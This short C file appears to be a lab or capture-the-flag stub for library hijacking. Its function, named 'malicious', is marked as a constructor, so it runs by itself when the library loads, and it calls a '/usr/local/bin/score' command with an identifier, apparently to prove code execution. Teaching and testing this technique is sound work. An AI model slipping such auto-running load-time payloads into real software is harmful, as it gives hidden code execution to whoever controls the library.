#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 42afb12f-6344-400d-91ae-db7de07ef727");
}

